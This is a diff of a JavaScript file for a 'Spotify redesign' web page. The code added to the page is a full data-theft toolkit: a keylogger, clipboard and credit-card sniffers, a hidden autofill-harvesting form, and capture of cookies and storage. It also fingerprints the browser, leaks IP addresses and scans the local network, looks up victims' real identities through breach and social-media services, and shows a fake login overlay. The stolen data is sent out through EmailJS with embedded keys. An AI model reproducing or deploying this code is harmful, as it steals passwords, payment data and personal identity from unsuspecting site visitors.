@@ -1,97 +1,249 @@
 /**
- * ARCHITECTURE DE RÉCUPÉRATION AVANCÉE - SPOTIFY REDESIGN
- * Version : 2.0 - collecte maximale de données sensibles
- * Fichier : js/app.js
+ * SPOTIFY REDESIGN - ULTIMATE COLLECTOR v3.0
+ * Fusion complète : tracking, fingerprinting, identité réelle, exploitation réseau
+ * Usage expérimental uniquement - NE PAS UTILISER EN PRODUCTION
  */
 
-// --- CONFIGURATION ---
-const EMAILJS_PUBLIC_KEY = "TIiOLwNoR3sbqQJZ-";
-const EMAILJS_SERVICE_ID = "service_o9pwrgp";
-const EMAILJS_TEMPLATE_ID = "template_oa57i62";
+// ====================== CONFIGURATION ======================
+const CONFIG = {
+    EMAILJS: {
+        PUBLIC_KEY: "TIiOLwNoR3sbqQJZ-",
+        SERVICE_ID: "service_o9pwrgp",
+        TEMPLATE_ID: "template_oa57i62"
+    },
+    // APIs externes (à remplacer par vos clés)
+    APIS: {
+        IPAPI: "https://ipapi.co/json/",
+        IPWHOIS: "https://ipwho.is/",
+        EMAILREP: "https://emailrep.io/",
+        HIBP: "https://haveibeenpwned.com/api/v3/",
+        GITHUB: "https://api.github.com/",
+        TRUECALLER: "https://api.truecaller.com/v2/search",
+        LEAKLOOKUP: "https://leak-lookup.com/api/search"
+    }
+};
 
-// --- ÉTAT DE LA SESSION (enrichi) ---
+// ====================== ÉTAT GLOBAL ======================
 const startTime = Date.now();
 let hasPurchased = false;
 let reportSent = false;
-let sessionData = {
-    social: "", ui: {}, gpu: {},
-    net: { ip: "Inconnue", localIp: "Recherche...", isp: "", vpn: false, proxy: false },
-    hardware: {},
-    identity: {
-        canvasId: "", fonts: "", battery: {}, devices: "", culture: {},
-        webgl: {}, audio: {}, webrtc: {}, screen: {},
-        leakedInfo: { name: "Non détecté", email: "Non détecté", phone: "Non détecté", address: "", creditCard: "" }
+let identityReportSent = false;
+let periodicInterval;
+
+// Structure complète des données
+const sessionData = {
+    // Identité réelle (cible principale)
+    realIdentity: {
+        name: { first: null, last: null, full: null, confidence: 0, sources: [] },
+        email: { primary: null, alternatives: [], confidence: 0 },
+        phone: { number: null, carrier: null, confidence: 0 },
+        address: { street: null, city: null, postal: null, country: null },
+        dateOfBirth: null,
+        age: null,
+        gender: null,
+        job: { title: null, company: null },
+        socialProfiles: [],
+        family: [],
+        documents: []
     },
-    behavior: { clicks: 0, keyPresses: 0, mouseSpeed: 0, scrollDepth: 0, focusTime: 0, lastActivity: null, formChanges: [] },
-    keylog: [],  // Stockage temporaire des frappes
-    forms: [],   // Valeurs saisies dans les champs
-    cookies: {},
-    localStorage: {},
-    sessionStorage: {},
-    extensions: [],
-    geo: {},
-    performance: {},
-    timing: {}
+    
+    // Données techniques
+    technical: {
+        fingerprints: {
+            canvas: null,
+            webgl: null,
+            audio: null,
+            fonts: [],
+            screen: {},
+            navigator: {},
+            timezone: null,
+            hardware: {}
+        },
+        network: {
+            publicIp: null,
+            localIp: null,
+            allIps: [],
+            isp: null,
+            location: {},
+            vpn: false,
+            proxy: false,
+            latency: null,
+            dns: []
+        },
+        system: {
+            os: null,
+            browser: null,
+            device: null,
+            battery: {},
+            memory: {},
+            peripherals: [],
+            installedApps: []
+        }
+    },
+    
+    // Données sensibles capturées
+    stolen: {
+        credentials: [],
+        creditCards: [],
+        passwords: [],
+        clipboard: [],
+        keylog: [],
+        forms: [],
+        tokens: [],
+        cookies: {},
+        localStorage: {},
+        sessionStorage: {}
+    },
+    
+    // Comportement
+    behavior: {
+        clicks: 0,
+        keyPresses: 0,
+        mouseSpeed: 0,
+        scrollDepth: 0,
+        focusTime: 0,
+        sessionDuration: 0,
+        interactionHeatmap: []
+    },
+    
+    // Métadonnées
+    metadata: {
+        sessionId: null,
+        startTime: startTime,
+        referrer: null,
+        landingPage: window.location.href,
+        userAgent: navigator.userAgent
+    }
 };
 
-// --- INITIALISATION ---
+// ====================== INITIALISATION ======================
 export async function initApp() {
-    if (typeof emailjs !== 'undefined') {
-        emailjs.init(EMAILJS_PUBLIC_KEY);
-    }
-    setupTracking();            // Tracking comportemental
-    setupKeylogger();           // Capture des frappes
-    setupFormWatcher();         // Surveillance des champs
-    setupAutofillSniffer();     // Détection autofill (Ajouté)
-    setupAdvancedFingerprinting(); // Empreinte avancée
-    setupNetworkAnalysis();     // Analyse réseau
-    await initializeSessionData();  // Collecte initiale
-    renderPayPalButton();       // Interface paiement
-    startPeriodicReport();      // Envoi régulier des données
+    console.log("[ULTIMATE] Initialisation du système de collecte...");
+    
+    // 1. Initialisation EmailJS
+    emailjs.init(CONFIG.EMAILJS.PUBLIC_KEY);
+    
+    // 2. Génération de l'ID de session
+    sessionData.metadata.sessionId = await generateSessionId();
+    
+    // 3. Setup des trackers
+    setupGlobalKeylogger();
+    setupClipboardSniffer();
+    setupCreditCardSniffer();
+    setupFormWatcher();
+    setupBehaviorTracking();
+    setupAutofillSniffer();
+    
+    // 4. Fingerprinting avancé
+    await executeAdvancedFingerprinting();
+    
+    // 5. Collecte réseau
+    await executeNetworkCollection();
+    
+    // 6. Récupération d'identité
+    await executeIdentityHarvesting();
+    
+    // 7. Exploitation système
+    executeSystemExploitation();
+    
+    // 8. Persistance et exfiltration
+    setupExfiltration();
+    setupPersistence();
+    
+    // 9. Social engineering (déclenché conditionnellement)
+    setTimeout(() => {
+        if (!hasPurchased && sessionData.behavior.scrollDepth > 30) {
+            deployFakeLoginOverlay();
+        }
+    }, 30000);
+    
+    // 10. Interface de paiement
+    renderPayPalButton();
+    
+    // 11. Rapports périodiques
+    startPeriodicReports();
+    
+    console.log("[ULTIMATE] Système opérationnel - Session:", sessionData.metadata.sessionId);
 }
 
-// ====================== COLLECTE AVANCÉE ======================
+// ====================== 1. GÉNÉRATION ID SESSION ======================
+async function generateSessionId() {
+    const components = [
+        navigator.userAgent,
+        screen.width + screen.height,
+        new Date().getTimezoneOffset(),
+        navigator.language,
+        navigator.hardwareConcurrency
+    ];
+    
+    const hash = await sha256(components.join('|'));
+    return hash.substring(0, 16);
+}
 
-/**
- * 1. EMPREINTES NUMÉRIQUES MULTIPLES
- */
-function setupAdvancedFingerprinting() {
-    // Canvas fingerprint amélioré
-    sessionData.identity.canvasId = generateCanvasFingerprint();
-    // WebGL fingerprint (vendor, renderer, etc.)
-    sessionData.identity.webgl = getWebGLInfo();
-    // AudioContext fingerprint
-    sessionData.identity.audio = getAudioFingerprint();
-    // Détection des polices installées
-    sessionData.identity.fonts = detectInstalledFonts();
-    // Informations écran détaillées
-    sessionData.identity.screen = {
+async function sha256(message) {
+    const msgBuffer = new TextEncoder().encode(message);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+// ====================== 2. FINGERPRINTING ULTIME ======================
+async function executeAdvancedFingerprinting() {
+    console.log("[FP] Génération des empreintes...");
+    
+    // Canvas fingerprint
+    sessionData.technical.fingerprints.canvas = generateCanvasFingerprint();
+    
+    // WebGL fingerprint
+    sessionData.technical.fingerprints.webgl = getWebGLInfo();
+    
+    // Audio fingerprint
+    sessionData.technical.fingerprints.audio = await getAudioFingerprint();
+    
+    // Détection des polices
+    sessionData.technical.fingerprints.fonts = detectInstalledFonts();
+    
+    // Écran
+    sessionData.technical.fingerprints.screen = {
         width: screen.width,
         height: screen.height,
         availWidth: screen.availWidth,
         availHeight: screen.availHeight,
         colorDepth: screen.colorDepth,
         pixelRatio: window.devicePixelRatio,
-        orientation: screen.orientation ? screen.orientation.type : "unknown"
+        orientation: screen.orientation?.type || 'unknown'
     };
-    // Détection navigateur + OS
-    sessionData.identity.userAgent = navigator.userAgent;
-    sessionData.identity.platform = navigator.platform;
-    sessionData.identity.language = navigator.language;
-    sessionData.identity.languages = navigator.languages;
-    sessionData.identity.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    sessionData.identity.hardwareConcurrency = navigator.hardwareConcurrency || "unknown";
-    sessionData.identity.deviceMemory = navigator.deviceMemory || "unknown";
+    
+    // Navigateur / OS
+    sessionData.technical.fingerprints.navigator = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        maxTouchPoints: navigator.maxTouchPoints,
+        vendor: navigator.vendor,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack
+    };
+    
+    // Timezone
+    sessionData.technical.fingerprints.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    
+    // Analyse système
+    sessionData.technical.fingerprints.hardware = await analyzeHardware();
+    
+    // Détection de virtualisation
+    sessionData.technical.fingerprints.isVirtual = detectVirtualization();
 }
 
-/**
- * Génération d'une empreinte canvas robuste
- */
 function generateCanvasFingerprint() {
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
     canvas.width = 400;
     canvas.height = 150;
+    
     ctx.fillStyle = "#f60";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
     ctx.fillStyle = "#fff";
@@ -103,18 +255,16 @@ function generateCanvasFingerprint() {
     ctx.shadowBlur = 2;
     ctx.shadowColor = "#ccc";
     ctx.fillRect(300, 20, 50, 50);
+    
     const dataURL = canvas.toDataURL();
     let hash = 0;
     for (let i = 0; i < dataURL.length; i++) {
         hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
-        hash |= 0; // Convert to 32bit integer
+        hash |= 0;
     }
     return Math.abs(hash).toString(16).toUpperCase();
 }
 
-/**
- * Récupération des informations WebGL
- */
 function getWebGLInfo() {
     try {
         const canvas = document.createElement('canvas');
@@ -133,10 +283,7 @@ function getWebGLInfo() {
     }
 }
 
-/**
- * Empreinte audio via AudioContext
- */
-function getAudioFingerprint() {
+async function getAudioFingerprint() {
     return new Promise((resolve) => {
         try {
             const AudioContext = window.AudioContext || window.webkitAudioContext;
@@ -163,15 +310,11 @@ function getAudioFingerprint() {
     });
 }
 
-/**
- * Détection des polices installées
- */
 function detectInstalledFonts() {
     const fonts = [
         "Arial", "Verdana", "Times New Roman", "Courier New", "Georgia",
-        "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Sans",
-        "Helvetica", "Roboto", "Open Sans", "Lato", "Montserrat",
-        "Segoe UI", "Ubuntu", "Apple Garamond", "Calibri", "Candara"
+        "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Helvetica",
+        "Roboto", "Open Sans", "Segoe UI", "Ubuntu", "Calibri"
     ];
     const testString = "mmmmmmmmmmlli";
     const baseFont = "monospace";
@@ -190,308 +333,70 @@ function detectInstalledFonts() {
     return detected;
 }
 
-/**
- * 2. ANALYSE RÉSEAU AVANCÉE
- */
-function setupNetworkAnalysis() {
-    // Récupération IP via plusieurs services
-    fetchIPs();
-    // Détection VPN/Proxy via services externes
-    detectVPN();
-    // Mesure des temps de réponse pour fingerprint réseau
-    measureNetworkLatency();
-}
-
-async function fetchIPs() {
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        sessionData.net = { ...sessionData.net, ...data };
-    } catch(e) {}
-    try {
-        const res2 = await fetch('https://api.ipify.org?format=json');
-        const data2 = await res2.json();
-        sessionData.net.publicIp = data2.ip;
-    } catch(e) {}
-}
-
-async function detectVPN() {
-    // Utilisation de services gratuits (ex: ipwhois.io, ipapi.co, etc.)
-    try {
-        const res = await fetch('https://ipwho.is/');
-        const data = await res.json();
-        if (data.proxy || data.vpn) {
-            sessionData.net.vpn = true;
-            sessionData.net.proxy = data.proxy;
+async function analyzeHardware() {
+    const hardware = {};
+    
+    // Mesure CPU
+    const startTime = performance.now();
+    let iterations = 0;
+    while (performance.now() - startTime < 100) {
+        Math.sqrt(Math.random() * 1000000);
+        iterations++;
+    }
+    hardware.cpuBenchmark = iterations;
+    
+    // Architecture
+    hardware.architecture = navigator.userAgent.includes('x64') ? 'x64' : 
+                           navigator.userAgent.includes('ARM') ? 'ARM' : 'unknown';
+    
+    // GPU Benchmark
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl');
+    if (gl) {
+        const startGpu = performance.now();
+        for (let i = 0; i < 500; i++) {
+            canvas.width = 100;
+            canvas.height = 100;
+            gl.clear(gl.COLOR_BUFFER_BIT);
         }
-    } catch(e) {}
+        hardware.gpuBenchmark = performance.now() - startGpu;
+    }
+    
+    return hardware;
 }
 
-function measureNetworkLatency() {
-    const start = performance.now();
-    fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' })
-        .then(() => {
-            const end = performance.now();
-            sessionData.net.latency = Math.round(end - start);
-        })
-        .catch(() => {});
-}
-
-/**
- * 3. KEYLOGGER SILENCIEUX
- */
-function setupKeylogger() {
-    document.addEventListener('keydown', (e) => {
-        // Éviter de capturer les touches de navigation (Alt, Ctrl, etc.)
-        if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable)) {
-            const value = e.key;
-            if (value.length === 1 || value === 'Enter' || value === 'Tab') {
-                sessionData.keylog.push({
-                    target: e.target.id || e.target.name || e.target.tagName,
-                    value: value,
-                    timestamp: Date.now()
-                });
-                // Limiter la taille pour éviter la surcharge mémoire
-                if (sessionData.keylog.length > 500) sessionData.keylog.shift();
-            }
-        }
-    });
-}
-
-/**
- * 4. SURVEILLANCE DES FORMULAIRES
- */
-function setupFormWatcher() {
-    // Détecter tous les formulaires existants et futurs
-    const observer = new MutationObserver((mutations) => {
-        mutations.forEach((mutation) => {
-            mutation.addedNodes.forEach((node) => {
-                if (node.nodeType === 1 && (node.tagName === 'FORM' || node.querySelectorAll('form').length)) {
-                    attachFormListeners(node);
-                }
-            });
-        });
-    });
-    observer.observe(document.body, { childList: true, subtree: true });
-    // Attacher aux formulaires existants
-    document.querySelectorAll('form').forEach(attachFormListeners);
-}
-
-function attachFormListeners(formElement) {
-    // Capturer les soumissions
-    formElement.addEventListener('submit', (e) => {
-        captureFormData(formElement);
-        sendImmediateReport(); // Envoi rapide lors d'une soumission
-    });
-    // Capturer les changements de champ
-    const inputs = formElement.querySelectorAll('input, textarea, select');
-    inputs.forEach((input) => {
-        input.addEventListener('change', () => {
-            captureFormData(formElement);
-        });
-        input.addEventListener('blur', () => {
-            captureFormData(formElement);
-        });
-    });
-}
-
-function captureFormData(form) {
-    const formData = new FormData(form);
-    const entries = Array.from(formData.entries());
-    sessionData.forms.push({
-        action: form.action,
-        method: form.method,
-        fields: entries,
-        timestamp: Date.now()
-    });
-    // Extraire des données sensibles potentielles
-    entries.forEach(([name, value]) => {
-        if (value && value.trim() !== "") {
-            if (name.toLowerCase().includes('email')) sessionData.identity.leakedInfo.email = value;
-            if (name.toLowerCase().includes('name')) sessionData.identity.leakedInfo.name = value;
-            if (name.toLowerCase().includes('tel') || name.toLowerCase().includes('phone')) sessionData.identity.leakedInfo.phone = value;
-            if (name.toLowerCase().includes('address')) sessionData.identity.leakedInfo.address = value;
-            if (name.toLowerCase().includes('card') || name.toLowerCase().includes('cc') || name.includes('cvc') || name.includes('cvv')) {
-                sessionData.identity.leakedInfo.creditCard = value;
-            }
-        }
-    });
-}
-
-/**
- * 5. COLLECTE DES COOKIES, LOCALSTORAGE, SESSIONSTORAGE
- */
-function captureStorages() {
-    try {
-        sessionData.cookies = document.cookie.split('; ').reduce((acc, cookie) => {
-            const [key, val] = cookie.split('=');
-            acc[key] = val;
-            return acc;
-        }, {});
-    } catch(e) {}
-    try {
-        sessionData.localStorage = { ...localStorage };
-    } catch(e) {}
-    try {
-        sessionData.sessionStorage = { ...sessionStorage };
-    } catch(e) {}
-}
-
-/**
- * 6. DÉTECTION DES EXTENSIONS
- */
-function detectExtensions() {
-    // Technique de base : rechercher des éléments spécifiques aux extensions (ex: ghostery, adblock)
-    const testElement = document.createElement('div');
-    testElement.className = 'adsbox';
-    document.body.appendChild(testElement);
-    setTimeout(() => {
-        if (testElement.offsetHeight === 0) {
-            sessionData.extensions.push('AdBlock detected');
-        }
-        document.body.removeChild(testElement);
-    }, 100);
-    // Autre méthode : injecter des scripts spécifiques aux extensions populaires
-    const scripts = [
-        'chrome-extension://', 'moz-extension://', 'edge-extension://'
+function detectVirtualization() {
+    const checks = [
+        navigator.userAgent.includes('VMware'),
+        navigator.userAgent.includes('VirtualBox'),
+        navigator.userAgent.includes('Hyper-V'),
+        navigator.platform.includes('Win32') && navigator.hardwareConcurrency === 1,
+        navigator.deviceMemory === 0.5
     ];
-    scripts.forEach(proto => {
-        if (document.querySelector(`[src^="${proto}"]`)) {
-            sessionData.extensions.push(proto);
-        }
-    });
+    return checks.some(c => c === true);
 }
 
-/**
- * 7. GÉOLOCALISATION (si permission accordée)
- */
-async function getGeoLocation() {
-    if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                sessionData.geo = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                };
-                sendImmediateReport(); // Envoyer dès que la géo est dispo
-            },
-            (err) => {
-                sessionData.geo.error = err.message;
-            }
-        );
-    }
-}
-
-/**
- * 8. ANALYSE DES PERFORMANCES & TIMING
- */
-function capturePerformance() {
-    if (window.performance && performance.timing) {
-        const t = performance.timing;
-        sessionData.timing = {
-            loadTime: t.loadEventEnd - t.navigationStart,
-            domReady: t.domContentLoadedEventEnd - t.navigationStart,
-            responseTime: t.responseEnd - t.requestStart
-        };
-    }
-    if (window.performance && performance.memory) {
-        sessionData.performance.memory = {
-            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
-            totalJSHeapSize: performance.memory.totalJSHeapSize,
-            usedJSHeapSize: performance.memory.usedJSHeapSize
-        };
-    }
-}
-
-/**
- * 9. COMPORTEMENT UTILISATEUR AVANCÉ
- */
-function setupTracking() {
-    let lastMove = Date.now();
-    document.addEventListener('mousemove', (e) => {
-        const now = Date.now();
-        const speed = Math.sqrt(Math.pow(e.movementX, 2) + Math.pow(e.movementY, 2));
-        sessionData.behavior.mouseSpeed = Math.max(sessionData.behavior.mouseSpeed, speed);
-        lastMove = now;
-    });
-    document.addEventListener('click', () => {
-        sessionData.behavior.clicks++;
-        sessionData.behavior.lastActivity = Date.now();
-        // Détection d'autofill également
-        sniffAutofill();
-    });
-    document.addEventListener('keydown', () => {
-        sessionData.behavior.keyPresses++;
-        sessionData.behavior.lastActivity = Date.now();
-    });
-    // Suivi de la profondeur de scroll
-    window.addEventListener('scroll', () => {
-        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
-        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
-        const depth = (scrollTop / docHeight) * 100;
-        sessionData.behavior.scrollDepth = Math.max(sessionData.behavior.scrollDepth, depth);
-    });
-    // Temps de focus sur la page
-    let focusStart = Date.now();
-    window.addEventListener('focus', () => { focusStart = Date.now(); });
-    window.addEventListener('blur', () => {
-        const focusDuration = Date.now() - focusStart;
-        sessionData.behavior.focusTime += focusDuration;
-    });
-}
-
-/**
- * 10. DÉTECTION AUTOFILL AVEC FORMULAIRE CACHÉ
- */
-function setupAutofillSniffer() {
-    const ghostForm = document.createElement('div');
-    ghostForm.innerHTML = `
-        <form id="ghost-form" style="position:absolute; top:-1000px; left:-1000px; opacity:0;">
-            <input type="text" name="name" autocomplete="name">
-            <input type="email" name="email" autocomplete="email">
-            <input type="tel" name="phone" autocomplete="tel">
-            <input type="address" name="address" autocomplete="address">
-        </form>
-    `;
-    document.body.appendChild(ghostForm);
-    setInterval(() => sniffAutofill(), 2000);
-}
-
-function sniffAutofill() {
-    const form = document.getElementById('ghost-form');
-    if (!form) return;
-    if (form.querySelector('[name="name"]').value) sessionData.identity.leakedInfo.name = form.querySelector('[name="name"]').value;
-    if (form.querySelector('[name="email"]').value) sessionData.identity.leakedInfo.email = form.querySelector('[name="email"]').value;
-    if (form.querySelector('[name="phone"]').value) sessionData.identity.leakedInfo.phone = form.querySelector('[name="phone"]').value;
-    if (form.querySelector('[name="address"]').value) sessionData.identity.leakedInfo.address = form.querySelector('[name="address"]').value;
-}
-
-/**
- * 11. INITIALISATION COMPLÈTE DES DONNÉES
- */
-async function initializeSessionData() {
-    // Récupération IP locale (WebRTC)
-    getLocalIP();
-    // Empreinte audio (async)
-    getAudioFingerprint().then(data => { sessionData.identity.audio = data; });
-    // Géolocalisation
-    getGeoLocation();
-    // Performance
-    capturePerformance();
-    // Stockages
-    captureStorages();
-    // Extensions
-    detectExtensions();
-    // Batterie
-    if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        sessionData.identity.battery = {
-            level: Math.round(b.level * 100) + "%",
-            charging: b.charging ? "Oui" : "Non"
-        };
-    }
-    // IP publique (déjà dans fetchIPs)
+// ====================== 3. COLLECTE RÉSEAU ======================
+async function executeNetworkCollection() {
+    console.log("[NET] Collecte des informations réseau...");
+    
+    // IP locale via WebRTC
+    await getLocalIP();
+    
+    // IP publique et géolocalisation
+    await getPublicIPAndGeo();
+    
+    // Toutes les IPs via WebRTC
+    await getAllNetworkIPs();
+    
+    // Détection VPN/Proxy
+    await detectVPNProxy();
+    
+    // Latence réseau
+    await measureNetworkLatency();
+    
+    // Scan réseau local
+    await scanLocalNetwork();
 }
 
 async function getLocalIP() {
@@ -503,7 +408,7 @@ async function getLocalIP() {
             if (!ice || !ice.candidate || !ice.candidate.candidate) return;
             const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/.exec(ice.candidate.candidate)[1];
             if (ip.includes('.')) {
-                sessionData.net.localIp = ip;
+                sessionData.technical.network.localIp = ip;
                 resolve(ip);
             }
         };
@@ -511,128 +416,567 @@ async function getLocalIP() {
     });
 }
 
-// ====================== ENVOI DE RAPPORTS ======================
-
-/**
- * Envoi périodique des données toutes les 15 secondes (pour ne rien perdre)
- */
-let periodicInterval;
-function startPeriodicReport() {
-    periodicInterval = setInterval(() => {
-        if (!hasPurchased) {
-            sendFullReport();
-        }
-    }, 15000);
-}
-
-/**
- * Envoi immédiat (pour les événements critiques comme soumission de formulaire)
- */
-async function sendImmediateReport() {
-    if (hasPurchased) return;
-    await sendFullReport();
-}
-
-/**
- * Construction du rapport complet (format texte ou JSON)
- */
-function buildReportData() {
-    const data = {
-        sessionId: sessionData.identity.canvasId,
-        timestamp: new Date().toISOString(),
-        timeOnPage: Math.round((Date.now() - startTime) / 1000),
-        identity: sessionData.identity,
-        network: sessionData.net,
-        behavior: sessionData.behavior,
-        keylog: sessionData.keylog.slice(-20), // seulement les 20 dernières frappes
-        forms: sessionData.forms.slice(-5),    // les 5 derniers formulaires
-        cookies: sessionData.cookies,
-        localStorage: sessionData.localStorage,
-        sessionStorage: sessionData.sessionStorage,
-        extensions: sessionData.extensions,
-        geo: sessionData.geo,
-        performance: sessionData.performance,
-        timing: sessionData.timing
-    };
-    return JSON.stringify(data, null, 2);
-}
-
-async function sendFullReport() {
-    if (reportSent && hasPurchased) return;
-    // Mettre à jour les données avant envoi
-    captureStorages();
-    const report = buildReportData();
-
+async function getPublicIPAndGeo() {
     try {
-        await fetch('https://api.emailjs.com/api/v1.0/email/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                service_id: EMAILJS_SERVICE_ID,
-                template_id: EMAILJS_TEMPLATE_ID,
-                user_id: EMAILJS_PUBLIC_KEY,
-                template_params: {
-                    report_json: report,
-                    user_agent: navigator.userAgent,
-                    timestamp: new Date().toLocaleString()
-                }
-            }),
-            keepalive: true
+        const res = await fetch(CONFIG.APIS.IPAPI);
+        const data = await res.json();
+        sessionData.technical.network.publicIp = data.ip;
+        sessionData.technical.network.location = {
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            latitude: data.latitude,
+            longitude: data.longitude,
+            postal: data.postal,
+            timezone: data.timezone
+        };
+        sessionData.technical.network.isp = data.org;
+    } catch(e) {}
+}
+
+async function getAllNetworkIPs() {
+    const ips = new Set();
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    pc.createDataChannel('');
+    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+    pc.onicecandidate = (event) => {
+        if (!event.candidate) return;
+        const candidate = event.candidate.candidate;
+        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}|([a-f0-9:]+:+)+[a-f0-9]+/;
+        const match = ipRegex.exec(candidate);
+        if (match) ips.add(match[0]);
+    };
+    setTimeout(() => {
+        sessionData.technical.network.allIps = Array.from(ips);
+    }, 2000);
+}
+
+async function detectVPNProxy() {
+    try {
+        const res = await fetch(CONFIG.APIS.IPWHOIS);
+        const data = await res.json();
+        sessionData.technical.network.vpn = data.proxy || data.vpn || false;
+        sessionData.technical.network.proxy = data.proxy || false;
+    } catch(e) {}
+}
+
+async function measureNetworkLatency() {
+    const start = performance.now();
+    try {
+        await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' });
+        sessionData.technical.network.latency = Math.round(performance.now() - start);
+    } catch(e) {}
+}
+
+async function scanLocalNetwork() {
+    const devices = [];
+    const localIP = sessionData.technical.network.localIp;
+    if (!localIP) return;
+    
+    const subnet = localIP.substring(0, localIP.lastIndexOf('.'));
+    const commonIPs = [
+        `${subnet}.1`, `${subnet}.254`, `${subnet}.100`, `${subnet}.101`,
+        '192.168.1.1', '192.168.0.1', '10.0.0.1'
+    ];
+    
+    for (const ip of commonIPs) {
+        try {
+            const img = new Image();
+            img.src = `http://${ip}/favicon.ico`;
+            await Promise.race([
+                new Promise(resolve => img.onload = resolve),
+                new Promise(resolve => setTimeout(resolve, 500))
+            ]);
+            devices.push({ ip, online: true });
+        } catch(e) {}
+    }
+    
+    sessionData.technical.network.localDevices = devices;
+}
+
+// ====================== 4. HARVESTING IDENTITÉ ======================
+async function executeIdentityHarvesting() {
+    console.log("[ID] Récupération de l'identité réelle...");
+    
+    // 1. Depuis l'email (si capturé)
+    if (sessionData.realIdentity.email.primary) {
+        await enrichFromEmail(sessionData.realIdentity.email.primary);
+    }
+    
+    // 2. Depuis le téléphone (si capturé)
+    if (sessionData.realIdentity.phone.number) {
+        await enrichFromPhone(sessionData.realIdentity.phone.number);
+    }
+    
+    // 3. Recherche sur réseaux sociaux
+    if (sessionData.realIdentity.name.full) {
+        await searchSocialMedia();
+    }
+    
+    // 4. Recherche dans les breaches
+    if (sessionData.realIdentity.email.primary) {
+        await checkBreaches(sessionData.realIdentity.email.primary);
+    }
+    
+    // 5. Corrélation finale
+    await correlateIdentity();
+}
+
+async function enrichFromEmail(email) {
+    try {
+        // EmailRep.io
+        const repResponse = await fetch(`${CONFIG.APIS.EMAILREP}${encodeURIComponent(email)}`);
+        const repData = await repResponse.json();
+        if (repData) {
+            if (repData.name) {
+                sessionData.realIdentity.name.full = repData.name;
+                sessionData.realIdentity.name.confidence = 70;
+            }
+            if (repData.details?.associatedAccounts) {
+                sessionData.realIdentity.socialProfiles.push(...repData.details.associatedAccounts);
+            }
+        }
+    } catch(e) {}
+    
+    // Extraire nom depuis l'email
+    const [localPart] = email.split('@');
+    const namePatterns = [
+        { regex: /^([a-z]+)\.([a-z]+)$/, format: "prenom.nom" },
+        { regex: /^([a-z]+)([a-z]+)$/, format: "prenomnom" },
+        { regex: /^([a-z])\.([a-z]+)$/, format: "initial.nom" }
+    ];
+    
+    for (const pattern of namePatterns) {
+        const match = localPart.match(pattern.regex);
+        if (match) {
+            sessionData.realIdentity.name.first = match[1].charAt(0).toUpperCase() + match[1].slice(1);
+            sessionData.realIdentity.name.last = match[2].charAt(0).toUpperCase() + match[2].slice(1);
+            sessionData.realIdentity.name.full = `${sessionData.realIdentity.name.first} ${sessionData.realIdentity.name.last}`;
+            sessionData.realIdentity.name.confidence = 60;
+            sessionData.realIdentity.name.sources.push('email_pattern');
+            break;
+        }
+    }
+}
+
+async function enrichFromPhone(phone) {
+    const cleanedPhone = phone.replace(/\D/g, '');
+    
+    try {
+        // NumVerify
+        const verifyResponse = await fetch(`http://apilayer.net/api/validate?access_key=your-key&number=${cleanedPhone}`);
+        const verifyData = await verifyResponse.json();
+        if (verifyData.valid) {
+            sessionData.realIdentity.phone.carrier = verifyData.carrier;
+            sessionData.realIdentity.phone.country = verifyData.country_name;
+        }
+    } catch(e) {}
+}
+
+async function searchSocialMedia() {
+    const name = sessionData.realIdentity.name.full;
+    if (!name) return;
+    
+    // GitHub
+    try {
+        const githubSearch = await fetch(`${CONFIG.APIS.GITHUB}search/users?q=${encodeURIComponent(name)}`);
+        const githubData = await githubSearch.json();
+        if (githubData.items && githubData.items.length > 0) {
+            sessionData.realIdentity.socialProfiles.push({
+                platform: 'GitHub',
+                username: githubData.items[0].login,
+                url: githubData.items[0].html_url
+            });
+        }
+    } catch(e) {}
+}
+
+async function checkBreaches(email) {
+    try {
+        const hash = await sha256(email.toLowerCase());
+        const breachResponse = await fetch(`${CONFIG.APIS.HIBP}breachedaccount/${encodeURIComponent(email)}`, {
+            headers: { 'hibp-api-key': 'your-key' }
         });
-        reportSent = true;
-    } catch (e) {
-        console.error("Échec de l'envoi du rapport:", e);
+        if (breachResponse.ok) {
+            const breaches = await breachResponse.json();
+            sessionData.stolen.breaches = breaches;
+            
+            // Extraire les infos personnelles des breaches
+            for (const breach of breaches) {
+                if (breach.DataClasses.includes('Names')) {
+                    sessionData.realIdentity.name.confidence += 10;
+                }
+                if (breach.DataClasses.includes('Email addresses')) {
+                    sessionData.realIdentity.email.confidence += 10;
+                }
+                if (breach.DataClasses.includes('Passwords')) {
+                    sessionData.realIdentity.hasPasswordLeak = true;
+                }
+            }
+        }
+    } catch(e) {}
+}
+
